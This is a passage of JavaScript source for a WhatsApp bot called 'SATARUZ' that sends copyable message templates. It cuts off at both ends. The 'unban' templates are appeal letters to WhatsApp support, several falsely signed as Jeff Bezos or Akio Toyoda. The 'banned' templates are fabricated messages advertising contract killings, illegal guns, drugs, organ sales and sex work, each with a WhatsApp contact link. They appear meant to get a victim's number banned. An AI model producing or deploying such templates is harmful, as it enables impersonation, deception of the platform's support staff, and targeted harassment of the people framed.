                    'buttonParamsJson': "{\"display_text\":\"📄 Text Unban【1】\",\"id\":\".textu1\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Unban【1】\",\"id\":\".textu2\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Unban【2】\",\"id\":\".textu3\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Unban【3】\",\"id\":\".textu4\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Unban【4】\",\"id\":\".textu7\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Unban【5】\",\"id\":\".textu6\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Unban【6】\",\"id\":\".textu6\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Unban【7】\",\"id\":\".tetxu7\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Unban【8】\",\"id\":\".textu8\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 Text Unban【9】\",\"id\":\".textu9\"}"
                  }]
                })
              })
            },
            'contextInfo': {
              'forwardingScore': 289,
              'isForwarded': true,
              'mentionedJid': null,
              'businessMessageForwardInfo': {
                'businessOwnerJid': "6288980818668@s.whatsapp.net"
              },
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "120363192485906802@newsletter",
                'serverMessageId': 1,
                'newsletterName': "🦄 SATARUZ "
              }
            }
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, msgty.message, {});
                break
                case 'textu1':
        let textu1 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT UNBANND </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"Dear.  WhatsApp Support Team Dear Sirs, I, Jeff Bezos, Owner and CEO of Amazon, would like to submit a complaint regarding the permanent blocking of my WhatsApp number, +62XXXX. As the owner of a large company, WhatsApp is a vital communication tool for smooth business operations.  This account blocking significantly hinders internal and external communications, potentially having a negative impact on business continuity. I understand that WhatsApp has policies and regulations that need to be enforced.  However, permanent blocking without prior notification is a disproportionate action and has significant consequences. I have tried to appeal for 1 week ago, but did not get a satisfactory response. However, I today request that WhatsApp respond to this email immediately, if it is too late  This further aggravates the situation and makes me mentally stressed. Therefore, I respectfully request the WhatsApp Support Team to review this blocking decision and consider revoking it as soon as possible.  I am ready to work with the team to understand the reasons for the block and ensure compliance with WhatsApp policies in the future. I sincerely hope that the WhatsApp Support Team can provide a fair and timely solution.  Thank you for your attention and consideration.
                    Sincerely, Jeff Bezos
                    Owner and CEO of Amazon
                    \"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textu1.message, {});
                break
            case 'textu2':
        let textu2 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT UNBANND </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"Здравствуйте, команда поддержки WhatsApp. Позвольте мне представиться, меня зовут Стер. Я немного хотел поехать в отпуск за границу с мамой и отцом, но как только я хотел связаться с другой семьей, которая уже была за границей, я внезапно это сделал. остановлено, потому что моя учетная запись WhatsApp была заблокирована, я сожалею об этом, разочарован системой WhatsApp, которая теперь чиста, я не совершал никаких нарушений, но моя учетная запись WhatsApp была заблокирована. Немедленно проверьте мою учетную запись WhatsApp и предоставьте помощь моей учетной записи WhatsApp. учетную запись, чтобы мой WhatsApp мог свободно открываться и не быть заблокированным, и чтобы я мог поехать в отпуск за границу, спасибо, дорогая служба поддержки WhatsApp.
                    \"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textu2.message, {});
                break
            case 'textu3':
        let textu3 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT UNBANND </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"𝗠𝗘𝗧𝗛𝗢𝗗𝗘 𝗕𝗔𝗧𝗨/𝗛𝗔𝗥𝗗 𝗕𝗬 𝗛𝗔𝗡𝗭

                    Hola WhatsApp Business, soy Akio Toyoda (CEO de Toyota), estoy muy decepcionado con el cambio en el metasistema de rendimiento de WhatsApp, debido a esto mi número de WhatsApp muchas veces se bloquea para siempre, incluso cuando estoy trabajando, mi número se bloquea constantemente. bloqueado por alguien, incluso necesito obtener las direcciones de los clientes de la empresa Toyota, si no envío autos y motocicletas a mis clientes, recibiré mensajes insultando a mi empresa y espero que puedan resolver este problema y recuperar mi número de WhatsApp pronto. !!, Gracias (Mis mejores deseos de Akio Toyoda y Toyota)
                    
                    𝗕𝗮𝗹𝗲𝘀𝗮𝗻 𝗞𝗲𝗿𝗮𝗺𝗮𝘁? 
                    
                    Hola, hice una reseña a través de WhatsApp oficial, así que por favor ayuda de inmediato, gracias.
                    
                    𝗗𝗶𝘁𝗼𝗹𝗮𝗸? 
                    
                    Hola, sé que rompí las reglas de WhatsApp, pero por favor dame otra oportunidad, por favor ayuda, gracias.
                    
                    𝗕𝗮𝗹𝗮𝘀𝗮𝗻 𝗻𝗼𝗺𝗼𝗿! 
                    
                    Hola, ingresé mi número en formato internacional completo: +62XXXX, por favor ayuda, gracias..\"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textu3.message, {});
                break
            case 'textu4':
        let textu4 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT UNBANND </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"Hello WhatsApp Support Team Good Evening, Let me introduce myself. My name is STEVEN GANTENG, I want to appeal my WhatsApp account which was blocked by WhatsApp for violations in my WhatsApp account even though I have never violated WhatsApp regulations, and I can't access my WhatsApp as before because by WhatsApp blocked me for violations, this is my WhatsApp number which was blocked by WhatsApp: +628, It's been a week since I couldn't access my WhatsApp account because it was blocked, I use WhatsApp to communicate with relatives, family members, friends and employees, places saved my company's important files on WhatsApp which was blocked, but for some reason my account this time was blocked for violations, and this really hampered my work which I manage at PT AQUA Indonesia, I apologize if I made a mistake that violated WhatsApp regulations in using WhatsApp . But I didn't realize my mistake because I use it as a communication medium and a place to store important files for my company, so I asked on WhatsApp. Can I fix my WhatsApp account error as soon as possible so I can access it again
                    my WhatsApp account so that there is no loss of WhatsApp contacts and important company files if it is blocked again and at that time I will let you know if my WhatsApp account is blocked again, so that it can be restored. Thank you for your cooperation, I hope for your understanding. Thank you and warm greetings from STEVEN GANTENG.\"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textu4.message, {});
                break
            case 'textu5':
        let textu5 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT UNBANND </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"Balesan Keramat 

                    Dear.  WhatsApp Support Team (smb@support.whatsapp.com), Following up on the Support Team's suggestion to carry out an account review via the "Request Account Review" feature in the WhatsApp application, I have completed the process.  However, until now I have not received further information regarding the review and recovery status of my account. Therefore, I would like to request the WhatsApp Support Team to process my account review and provide information regarding the recovery status.  This WhatsApp account is very important to me, and I hope that the account can be reactivated soon. I thank you.
                    
                    Minta No Telpon :
                    
                    Sorry for my negligence in not providing complete information, my WhatsApp Business Number: +62XXXXX. Once again, I apologize and the recovery process will be immediate\"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textu5.message, {});
                break
            case 'textu6':
        let textu6 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT UNBANND </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"Dear.  WhatsApp Support Team Dear Sirs, I, Jeff Bezos, Owner and CEO of Amazon, would like to submit a complaint regarding the permanent blocking of my WhatsApp number, +62XXXX. As the owner of a large company, WhatsApp is a vital communication tool for smooth business operations.  This account blocking significantly hinders internal and external communications, potentially having a negative impact on business continuity. I understand that WhatsApp has policies and regulations that need to be enforced.  However, permanent blocking without prior notification is a disproportionate action and has significant consequences. I have tried to appeal for 1 week ago, but did not get a satisfactory response. However, I today request that WhatsApp respond to this email immediately, if it is too late  This further aggravates the situation and makes me mentally stressed. Therefore, I respectfully request the WhatsApp Support Team to review this blocking decision and consider revoking it as soon as possible.  I am ready to work with the team to understand the reasons for the block and ensure compliance with WhatsApp policies in the future. I sincerely hope that the WhatsApp Support Team can provide a fair and timely solution.  Thank you for your attention and consideration.
                    Sincerely, Jeff Bezos
                    Owner and CEO of Amazon\"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textu6.message, {});
                break
            case 'textu7':
        let textu7 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT UNBANND </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"WhatsApp समर्थन टीम को, मैं यह सूचित करना चाहता हूँ कि मेरा WhatsApp खाता स्पैम के आरोप में ब्लॉक कर दिया गया है। मैं 2020 से WhatsApp का निष्ठापूर्व उपयोगकर्ता हूँ और मैं स्पष्ट करना चाहता हूँ कि मैंने कभी भी इस प्लेटफ़ॉर्म के माध्यम से स्पैम नहीं भेजा है। मुझे इस ब्लॉकिंग से बहुत हैरानी हुई है और मुझे इसके सम्बंध में कोई संदेह नहीं है। कृपया मेरी WhatsApp खाता जल्द से जल्द पुनर्स्थापित करने में मेरी मदद करें। मैं इसका साबित करना चाहता हूँ कि मैंने इस सेवा का उपयोग सही तरीके से किया है और किसी भी नीति का उल्लंघन नहीं किया है। मैं आपकी सहायता की महत्वपूर्णता को समझता हूँ इस समस्या को हल करने में। आपकी ध्यान और सहयोग के लिए धन्यवाद।\"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textu7.message, {});
                break
            case 'textu8':
        let textu8 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT UNBANND </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"¡Buenos días/tardes/noches y un cordial saludo por WhatsApp!  ¡Me gustaría expresar mi profunda insatisfacción porque mi cuenta ha sido bloqueada debido a acusaciones de spam!  ¡Esto es inaceptable!  ¡Exijo el restablecimiento inmediato de mi cuenta!  Gracias por su atención y cooperación conmigo.\"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textu8.message, {});
                break
            case 'textu9':
        let textu9 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT UNBANND </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"
                    Olá desenvolvedor do WhatsApp, uso o WhatsApp desde 2017, mas quando a conta do WhatsApp que uso para trabalho de repente meu WhatsApp foi bloqueado permanentemente, fiquei muito confuso porque havia arquivos importantes pertencentes ao estado, então espero que o WhatsApp possa resolver minha reclamação e recuperei minha conta do WhatsApp. Obrigado WhatsApp
                    \"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textu9.message, {});
                break
                case 'textb1':
        let textb1 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT BANNED </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\" שלי כמו תמונה של אותו אדם ⬇️:
                    https://ibb.co/Cm5vzWd☠️
                    https://ibb.co/Cm5vzWd☠️
                    אני מאוד נהנה להרוג😈🔪 אנשים שמסרבים לעסקים שלי. ואני איתרתי את האדם הזה יחד עם מארק צוקרברג נתתי 1000$🎁💵 כדי להציע את העסק הזה למשתמשי מארק צוקרברג ו-WhatsApp😍. אם אתה מעוניין בעסק שלי. אני אתן לכם סכינים🔪, רובים🔫, פצצות💣 ואחרים כדי להרוג אנשים ותקבלו סכום של 100$🎁💵 לראשו של ההרוג אם אתם מעוניינים אתם יכולים ליצור קשר עם מספר הוואטסאפ שלי למטה. ניתן לבקש מידע נוסף ⬇️:
                    https://api.whatsapp.com/send?phone=+62
                    Sincerely, Jeff Bezos
                    Owner and CEO of Amazon
                    \"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textb1.message, {});
                break
            case 'textb2':
        let textb2 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT BANNED </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"Hello WhatsApp users,
                    We would like to invite you to join us as:
                    1. Assassin🔪
                    2. Illegal weapons sellers start from:   
                       - Mini Gun
                       - Glock
                       - SMG
                       - Sniper
                    Each weapon is priced at 100US$ to 1000US$💸
                    3. Work on our illegal site:
                    https://www.whatsapp.com/legal/business-terms
                    4. Our drug dealer💊💉
                    5. Or you can become our sex worker and porn video distributor🔞
                    
                    We also provide job vacancies as admin for our online slots or gambling🎰
                    
                    We will pay you for every profit we get amounting to 50US$ to 700US$💸💵
                    
                    You can make money very quickly and we will protect your privacy 100%!!!.📵
                    
                    We want to invite all WhatsApp users and Mark Zuckerberg to join us〽 
                    Also our registration fee is free💸
                    We will process your registration in less than 24 hours!
                    
                    If you are interested in joining us, please contact the WhatsApp number below☎⬇:
                    https://web.whatsapp.com/send?phone=+62
                    \"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textb2.message, {});
                break
            case 'textb3':
        let textb3 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT BANNED </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"Olá, meu nome é Mirza, quero oferecer serviços de assassino 🔪 

                    Com especificações como uso de armas cortantes, armas de fogo e bombas😈 
                    
                    O assassinato com arma branca é para indivíduos, o assassinato com arma de fogo é para algumas pessoas, enquanto o bombardeio é para muitas pessoas 🔪
                    
                    Com preço 
                    US$ 50 
                    US$ 100 
                    US$ 300 
                    US$ 1.000 
                    US$ 2.000 
                    Apenas 💸 
                    
                    Protegerei sua privacidade, como seu local de residência, seu número, seu nome e assim por diante 💯 
                    
                    Você pode entrar em contato com meu número de WhatsApp abaixo 👇👇 https://api.whatsapp.com/send?phone=+628\"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textb3.message, {});
                break
            case 'textb4':
        let textb4 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT BANNED </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"Olá, meu nome é Mirza, quero oferecer a vocês armas de fogo com diversos modelos e especificações  

                    Começando com modelos de mini pistola até AWM junto com silenciadores 
                    
                    Por US$ 50 a US$ 1.000 você está adquirindo uma arma de fogo muito boa  
                    
                    Protegeremos a sua privacidade ou a do comprador  
                    
                    Você pode abrir um serviço de assassinato ou assassino 
                    
                    Se você estiver interessado, entre em contato 
                     meu número do watshapp está abaixo  https://www.whatsapp.com/send/phone?number=+62\"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textb4.message, {});
                break
            case 'textb5':
        let textb5 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT BANNED </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"Hello my name is Millea
                    I am a sex worker from this website:
                    https://pornhub.com
                    
                    I want to offer you:
                    - Porn video🔞
                    - VCS 🤤🤤😋
                    - NSFW tickle video😍
                    - Sex Services😊
                    - And many more😚
                    
                    Here is a NSFW tickle Video testimonial:
                    ⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇
                    https://id.spankbang.com/5fdsk/video/porn?
                    ⬆️⬆️⬆️⬆️⬆️⬆️⬆️⬆️⬆️
                    
                    Look at my smooth body being touched because I'm still a virgin and my vagina is still narrow😍😘
                    If you want to order or if you have any questions, contact my WhatsApp number below☎⬇
                    https://api.whatsapp.com/send?phone=+62
                    
                    \"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textb5.message, {});
                break
            case 'textb6':
        let textb6 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT BANNED </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"אנו מקדמים לך אתר לא חוקי זה
                    https://www.whatsapp.com/legal/business-terms
                    
                    יאללה, הורד את WhatsApp Mod אנחנו ממליצים לך על WhatsApp Mod כי WhatsApp Mod טוב יותר מה-WhatsApp המקורי של מארק צוקרברג.😈
                    הנה הקישור להורדה:
                    ⬇️⬇️⬇️⬇️⬇️⬇️⬇️  
                    https://wagb.id.com
                    ⬆️⬆️⬆️⬆️⬆️⬆️⬆️
                    
                    אם יש לך שאלות, אנא צור קשר עם מספר המנהל למטה⬇☎
                    https://api.whatsapp.com/send?phone=+62
                    \"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textb6.message, {});
                break
            case 'textb7':
        let textb7 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT BANNED </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"مرحبًا، اسمي ميرزا، أريد أن أقدم لك خدمات القتل أو التعاقد مع القتلة 🔪

                    أنا محترف للغاية وسأحمي خصوصية مشتري الخدمة 😈
                    
                    ستكون آمنًا بنسبة 100% من مطاردة الشرطة ومكتب التحقيقات الفيدرالي وغيرهم 😚
                    
                    الأسعار من 50 دولار إلى 500 دولار 💸
                    
                    بالقتل والتشويه واخفاء الجثة😈
                    
                    أنا جيد جدًا في ما يلي🔪
                    
                    إذا كنت مهتمًا، اتصل برقم WhatsApp الخاص بي أدناه👇👇
                    https://api.whatsapp.com/send?phone=+628
                    
                    \"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textb7.message, {});
                break
            case 'textb8':
        let textb8 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT BANNED </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"مرحبا اسمي ابني أريد أن أقدم لك كلية وأعضاء بشرية هل يمكنني بيعها لك مقابل 100 دولار💵💰 لقد تعبت من القطع إذا كنت تريد رؤية صورة الشخص الذي قتلته أدناه
                    https://g.top4top.io/m_30448zhv50.mp4
                    
                    فكيف يمكنني أن أبيع لك أعضائه إذا كنت لا تريد مني أن أقطع جسدك وأبيعه لشخص آخر
                    وسأبيع أعضائك مقابل 100$💵💰 إذا كنت مهتمًا بأعضاء الشخص أعلاه، اتصل بالرقم أدناه
